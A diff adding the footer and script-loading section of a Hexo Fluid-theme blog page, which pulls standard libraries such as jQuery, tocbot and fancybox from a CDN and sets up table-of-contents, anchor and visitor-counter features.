+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
